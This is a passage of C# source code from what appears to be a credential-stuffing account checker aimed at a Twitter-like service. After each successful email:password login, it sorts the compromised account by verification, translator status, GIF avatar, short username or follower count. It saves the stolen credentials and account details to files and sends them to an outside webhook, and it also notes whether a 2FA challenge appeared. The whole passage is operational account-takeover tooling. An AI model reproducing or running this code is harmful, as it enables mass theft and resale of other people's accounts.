						Save.Writeline("| Username: @" + screen_name2, "OG Username [" + screen_name2.Length + "L] [2FA]", Save.mainDir + "/OG/");
						Save.Writeline("| Followers: " + normal_followers_count2, "OG Username [" + screen_name2.Length + "L] [2FA]", Save.mainDir + "/OG/");
						Save.Writeline("| Created: " + text19, "OG Username [" + screen_name2.Length + "L] [2FA]", Save.mainDir + "/OG/");
						Save.Writeline("| Country: " + text20, "OG Username [" + screen_name2.Length + "L] [2FA]", Save.mainDir + "/OG/");
						Save.Writeline("| Challenge: " + text17, "OG Username [" + screen_name2.Length + "L] [2FA]", Save.mainDir + "/OG/");
						Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "OG Username [" + screen_name2.Length + "L] [2FA]", Save.mainDir + "/OG/");
						Save.Writeline("   ", "OG Username [" + screen_name2.Length + "L] [2FA]", Save.mainDir + "/OG/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_OG Username [" + screen_name2.Length + "L] [2FA]", Save.mainDir + "/OG/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						return;
					}
					if (verified2)
					{
						if (text17 == "RetypeScreenName")
						{
							if (readConfig.useverifieds)
							{
								string username15 = "Verifieds";
								string content15 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")";
								SendWebhook(url, username15, content15);
							}
							Stats.NORMALVERIFIEDS++;
							Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "Verified", Save.mainDir + "/Verifieds/");
							Save.Writeline("| Username: @" + screen_name2, "Verified", Save.mainDir + "/Verifieds/");
							Save.Writeline("| Followers: " + normal_followers_count2, "Verified", Save.mainDir + "/Verifieds/");
							Save.Writeline("| Created: " + text19, "Verified", Save.mainDir + "/Verifieds/");
							Save.Writeline("| Country: " + text20, "Verified", Save.mainDir + "/Verifieds/");
							Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "Verified", Save.mainDir + "/Verifieds/");
							Save.Writeline("   ", "Verified", Save.mainDir + "/Verifieds/");
							Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_Verified", Save.mainDir + "/Verifieds/");
							Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
							Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
							return;
						}
						if (readConfig.useverifieds2)
						{
							string username16 = "[2FA] Verifieds";
							string content16 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + " Proxy IP: " + text21 + " (" + text22 + ")";
							SendWebhook(url, username16, content16);
						}
						Stats.VERIFIEDS2FA++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "Verified [2FA]", Save.mainDir + "/Verifieds/");
						Save.Writeline("| Username: @" + screen_name2, "Verified [2FA]", Save.mainDir + "/Verifieds/");
						Save.Writeline("| Followers: " + normal_followers_count2, "Verified [2FA]", Save.mainDir + "/Verifieds/");
						Save.Writeline("| Created: " + text19, "Verified [2FA]", Save.mainDir + "/Verifieds/");
						Save.Writeline("| Country: " + text20, "Verified [2FA]", Save.mainDir + "/Verifieds/");
						Save.Writeline("| Challenge: " + text17, "Verified [2FA]", Save.mainDir + "/Verifieds/");
						Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "Verified [2FA]", Save.mainDir + "/Verifieds/");
						Save.Writeline("   ", "Verified [2FA]", Save.mainDir + "/Verifieds/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_Verified [2FA]", Save.mainDir + "/Verifieds/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						return;
					}
					if (profile_image_url_https2.Contains(".gif"))
					{
						string tempPath2 = Path.GetTempPath();
						using (WebClient webClient2 = new WebClient())
						{
							webClient2.DownloadFile(profile_image_url_https2, tempPath2 + "temp.gif");
						}
						using (Image image2 = Image.FromFile(tempPath2 + "temp.gif"))
						{
							if (!ImageAnimator.CanAnimate(image2))
							{
								return;
							}
							if (text17 == "RetypeScreenName")
							{
								if (readConfig.usegif)
								{
									string username17 = "GIF Profile";
									string content17 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")";
									SendWebhook(url, username17, content17);
								}
								Stats.NORMALGIF++;
								Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "GIF", Save.mainDir + "/GIF/");
								Save.Writeline("| Username: @" + screen_name2, "GIF", Save.mainDir + "/GIF/");
								Save.Writeline("| Followers: " + normal_followers_count2, "GIF", Save.mainDir + "/GIF/");
								Save.Writeline("| Created: " + text19, "GIF", Save.mainDir + "/GIF/");
								Save.Writeline("| Country: " + text20, "GIF", Save.mainDir + "/GIF/");
								Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "GIF", Save.mainDir + "/GIF/");
								Save.Writeline("   ", "GIF", Save.mainDir + "/GIF/");
								Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_GIF", Save.mainDir + "/GIF/");
								Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
								Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
								return;
							}
							if (readConfig.usegif2)
							{
								string username18 = "[2FA] GIF Profile";
								string content18 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + " Proxy IP: " + text21 + " (" + text22 + ")";
								SendWebhook(url, username18, content18);
							}
							Stats.GIF2FA++;
							Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "GIF [2FA]", Save.mainDir + "/GIF/");
							Save.Writeline("| Username: @" + screen_name2, "GIF [2FA]", Save.mainDir + "/GIF/");
							Save.Writeline("| Followers: " + normal_followers_count2, "GIF [2FA]", Save.mainDir + "/GIF/");
							Save.Writeline("| Created: " + text19, "GIF [2FA]", Save.mainDir + "/GIF/");
							Save.Writeline("| Country: " + text20, "GIF [2FA]", Save.mainDir + "/GIF/");
							Save.Writeline("| Challenge: " + text17, "GIF [2FA]", Save.mainDir + "/GIF/");
							Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "GIF [2FA]", Save.mainDir + "/GIF/");
							Save.Writeline("   ", "GIF [2FA]", Save.mainDir + "/GIF/");
							Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_GIF [2FA]", Save.mainDir + "/GIF/");
							Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
							Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						}
						return;
					}
					if (is_translator2)
					{
						if (text17 == "RetypeScreenName")
						{
							if (readConfig.usetranslators)
							{
								string username19 = "Translators";
								string content19 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")";
								SendWebhook(url, username19, content19);
							}
							Stats.NORMALTRANSLATOR++;
							Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "Translator", Save.mainDir + "/Translators/");
							Save.Writeline("| Username: @" + screen_name2, "Translator", Save.mainDir + "/Translators/");
							Save.Writeline("| Followers: " + normal_followers_count2, "Translator", Save.mainDir + "/Translators/");
							Save.Writeline("| Created: " + text19, "Translator", Save.mainDir + "/Translators/");
							Save.Writeline("| Country: " + text20, "Translator", Save.mainDir + "/Translators/");
							Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "Translator", Save.mainDir + "/Translators/");
							Save.Writeline("   ", "Translator", Save.mainDir + "/Translators/");
							Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_Translator", Save.mainDir + "/Translators/");
							Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
							Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
							return;
						}
						if (readConfig.usetranslators2)
						{
							string username20 = "[2FA] Translators";
							string content20 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + " Proxy IP: " + text21 + " (" + text22 + ")";
							SendWebhook(url, username20, content20);
						}
						Stats.TRANSLATOR2FA++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "Translator [2FA]", Save.mainDir + "/Translators/");
						Save.Writeline("| Username: @" + screen_name2, "Translator [2FA]", Save.mainDir + "/Translators/");
						Save.Writeline("| Followers: " + normal_followers_count2, "Translator [2FA]", Save.mainDir + "/Translators/");
						Save.Writeline("| Created: " + text19, "Translator [2FA]", Save.mainDir + "/Translators/");
						Save.Writeline("| Country: " + text20, "Translator [2FA]", Save.mainDir + "/Translators/");
						Save.Writeline("| Challenge: " + text17, "Translator [2FA]", Save.mainDir + "/Translators/");
						Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "Translator [2FA]", Save.mainDir + "/Translators/");
						Save.Writeline("   ", "Translator [2FA]", Save.mainDir + "/Translators/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_Translator [2FA]", Save.mainDir + "/Translators/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						return;
					}
					if (screen_name2.Length == 1 || screen_name2.Length == 2 || screen_name2.Length == 3 || screen_name2.Length == 4)
					{
						if (text17 == "RetypeScreenName")
						{
							if (readConfig.use4l)
							{
								string username21 = "1 - 4 Letters";
								string content21 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")";
								SendWebhook(url, username21, content21);
							}
							Stats.NORMALLETTERNICK++;
							Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, screen_name2.Length + " Letters", Save.mainDir + "/1-4 Letters/");
							Save.Writeline("| Username: @" + screen_name2, screen_name2.Length + " Letters", Save.mainDir + "/1-4 Letters/");
							Save.Writeline("| Followers: " + normal_followers_count2, screen_name2.Length + " Letters", Save.mainDir + "/1-4 Letters/");
							Save.Writeline("| Created: " + text19, screen_name2.Length + " Letters", Save.mainDir + "/1-4 Letters/");
							Save.Writeline("| Country: " + text20, screen_name2.Length + " Letters", Save.mainDir + "/1-4 Letters/");
							Save.Writeline("| Proxy IP: " + text21 + "(" + text22 + ")", screen_name2.Length + " Letters", Save.mainDir + "/1-4 Letters/");
							Save.Writeline("   ", screen_name2.Length + " Letters", Save.mainDir + "/1-4 Letters/");
							Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_" + screen_name2.Length + " Letters", Save.mainDir + "/1-4 Letters/");
							Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
							Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
							return;
						}
						if (readConfig.use4l2)
						{
							string username22 = "[2FA] 1 - 4 Letters";
							string content22 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + " Proxy IP: " + text21 + " (" + text22 + ")";
							SendWebhook(url, username22, content22);
						}
						Stats.LETTERNICK2FA++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, screen_name2.Length + " Letters [2FA]", Save.mainDir + "/1-4 Letters/");
						Save.Writeline("| Username: @" + screen_name2, screen_name2.Length + " Letters [2FA]", Save.mainDir + "/1-4 Letters/");
						Save.Writeline("| Followers: " + normal_followers_count2, screen_name2.Length + " Letters [2FA]", Save.mainDir + "/1-4 Letters/");
						Save.Writeline("| Created: " + text19, screen_name2.Length + " Letters [2FA]", Save.mainDir + "/1-4 Letters/");
						Save.Writeline("| Country: " + text20, screen_name2.Length + " Letters [2FA]", Save.mainDir + "/1-4 Letters/");
						Save.Writeline("| Challenge: " + text17, screen_name2.Length + " Letters [2FA]", Save.mainDir + "/1-4 Letters/");
						Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", screen_name2.Length + " Letters [2FA]", Save.mainDir + "/1-4 Letters/");
						Save.Writeline("   ", screen_name2.Length + " Letters [2FA]", Save.mainDir + "/1-4 Letters/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_" + screen_name2.Length + " Letters [2FA]", Save.mainDir + "/1-4 Letters/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						return;
					}
					if (normal_followers_count2 > 1000 && 10000 > normal_followers_count2)
					{
						if (text17 == "RetypeScreenName")
						{
							if (readConfig.use1kto10k)
							{
								string username23 = "1K - 10K";
								string content23 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")";
								SendWebhook(url, username23, content23);
							}
							Stats.DODESET++;
							Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "1K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Username: @" + screen_name2, "1K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Followers: " + normal_followers_count2, "1K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Created: " + text19, "1K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Country: " + text20, "1K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "1K+", Save.mainDir + "/Followers/");
							Save.Writeline("   ", "1K+", Save.mainDir + "/Followers/");
							Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_1K+", Save.mainDir + "/Followers/");
							Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
							Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
							return;
						}
						if (readConfig.use1kto10k2)
						{
							string username24 = "[2FA] 1K - 10K";
							string content24 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + " Proxy IP: " + text21 + " (" + text22 + ")";
							SendWebhook(url, username24, content24);
						}
						Stats.DODESET2FA++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "1K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Username: @" + screen_name2, "1K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Followers: " + normal_followers_count2, "1K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Created: " + text19, "1K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Country: " + text20, "1K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Challenge: " + text17, "1K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "1K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("   ", "1K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_1K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						return;
					}
					if (normal_followers_count2 > 10000 && 20000 > normal_followers_count2)
					{
						if (text17 == "RetypeScreenName")
						{
							if (readConfig.use10kto20k)
							{
								string username25 = "10K - 20K";
								string content25 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")";
								SendWebhook(url, username25, content25);
							}
							Stats.DODVADESET++;
							Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "10K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Username: @" + screen_name2, "10K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Followers: " + normal_followers_count2, "10K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Created: " + text19, "10K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Country: " + text20, "10K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "10K+", Save.mainDir + "/Followers/");
							Save.Writeline("   ", "10K+", Save.mainDir + "/Followers/");
							Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_10K+", Save.mainDir + "/Followers/");
							Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
							Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
							return;
						}
						if (readConfig.use10kto20k2)
						{
							string username26 = "[2FA] 10K - 20K";
							string content26 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + " Proxy IP: " + text21 + " (" + text22 + ")";
							SendWebhook(url, username26, content26);
						}
						Stats.DODVADESET2FA++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "10K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Username: @" + screen_name2, "10K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Followers: " + normal_followers_count2, "10K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Created: " + text19, "10K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Country: " + text20, "10K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Challenge: " + text17, "10K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "10K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("   ", "10K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_10K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						return;
					}
					if (normal_followers_count2 > 20000 && 30000 > normal_followers_count2)
					{
						if (text17 == "RetypeScreenName")
						{
							if (readConfig.use20kto30k)
							{
								string username27 = "20K - 30K";
								string content27 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")";
								SendWebhook(url, username27, content27);
							}
							Stats.DOTRIDESET++;
							Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "20K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Username: @" + screen_name2, "20K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Followers: " + normal_followers_count2, "20K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Created: " + text19, "20K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Country: " + text20, "20K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "20K+", Save.mainDir + "/Followers/");
							Save.Writeline("   ", "20K+", Save.mainDir + "/Followers/");
							Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_30K+", Save.mainDir + "/Followers/");
							Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
							Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
							return;
						}
						if (readConfig.use20kto30k2)
						{
							string username28 = "[2FA] 20K - 30K";
							string content28 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + " Proxy IP: " + text21 + " (" + text22 + ")";
							SendWebhook(url, username28, content28);
						}
						Stats.DOTRIDESET2FA++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "20K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Username: @" + screen_name2, "20K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Followers: " + normal_followers_count2, "20K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Created: " + text19, "20K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Country: " + text20, "20K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Challenge: " + text17, "20K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "20K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("   ", "20K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_20K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						return;
					}
					if (normal_followers_count2 > 30000 && 50000 > normal_followers_count2)
					{
						if (text17 == "RetypeScreenName")
						{
							if (readConfig.use30kto50k)
							{
								string username29 = "30K - 50K";
								string content29 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")";
								SendWebhook(url, username29, content29);
							}
							Stats.DOPEDESET++;
							Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "30K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Username: @" + screen_name2, "30K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Followers: " + normal_followers_count2, "30K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Created: " + text19, "30K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Country: " + text20, "30K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "30K+", Save.mainDir + "/Followers/");
							Save.Writeline("   ", "30K+", Save.mainDir + "/Followers/");
							Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_30K+", Save.mainDir + "/Followers/");
							Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
							Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
							return;
						}
						if (readConfig.use30kto50k2)
						{
							string username30 = "[2FA] 30K - 50K";
							string content30 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + " Proxy IP: " + text21 + " (" + text22 + ")";
							SendWebhook(url, username30, content30);
						}
						Stats.DOPEDESET2FA++;
						Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "30K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Username: @" + screen_name2, "30K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Followers: " + normal_followers_count2, "30K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Created: " + text19, "30K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Country: " + text20, "30K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Challenge: " + text17, "30K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("| Proxy IP: " + text21 + " (" + text22 + ")", "30K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline("   ", "30K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Challenge: " + text17 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")", "line_30K+ [2FA]", Save.mainDir + "/Followers/");
						Save.Writeline(combo.Email + ":" + combo.Pass, "email_pass", Save.mainDir + "/RawHits/");
						Save.Writeline(screen_name2 + ":" + combo.Pass, "user_pass", Save.mainDir + "/RawHits/");
						return;
					}
					if (normal_followers_count2 > 50000)
					{
						if (text17 == "RetypeScreenName")
						{
							if (readConfig.use50kmore)
							{
								string username31 = "50K+";
								string content31 = combo.Email + ":" + combo.Pass + text18 + "Username: " + screen_name2 + text18 + "Followers: " + normal_followers_count2 + text18 + "Created: " + text19 + text18 + "Country: " + text20 + text18 + "Proxy IP: " + text21 + " (" + text22 + ")";
								SendWebhook(url, username31, content31);
							}
							Stats.PREKOPEDESET++;
							Save.Writeline("| Login: " + combo.Email + ":" + combo.Pass, "50K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Username: @" + screen_name2, "50K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Followers: " + normal_followers_count2, "50K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Created: " + text19, "50K+", Save.mainDir + "/Followers/");
							Save.Writeline("| Country: " + text20, "50K+", Save.mainDir + "/Followers/");
